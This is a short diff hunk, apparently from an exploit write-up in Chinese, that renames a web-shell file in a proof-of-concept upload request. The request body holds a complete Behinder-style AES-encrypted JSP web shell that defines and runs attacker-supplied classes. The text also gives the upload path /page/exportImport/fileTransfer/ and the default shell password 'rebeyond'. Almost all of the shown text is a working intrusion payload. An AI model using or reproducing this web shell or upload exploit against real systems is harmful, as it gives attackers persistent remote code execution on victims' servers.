@@ -56,13 +56,13 @@ x-forwarded-for: 127.0.0.1
 Connection: close
 
 ------WebKitFormBoundary6XgyjB6SeCArD3Hc
-Content-Disposition: form-data; name="file"; filename="peiqi.jsp"
+Content-Disposition: form-data; name="file"; filename="test.jsp"
 Content-Type: application/octet-stream
 
 <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
 ------WebKitFormBoundary6XgyjB6SeCArD3Hc--
 ```
 
-地址: /page/exportImport/fileTransfer/peiqi.jsp
+地址: /page/exportImport/fileTransfer/test.jsp
 
 默认密码 rebeyond
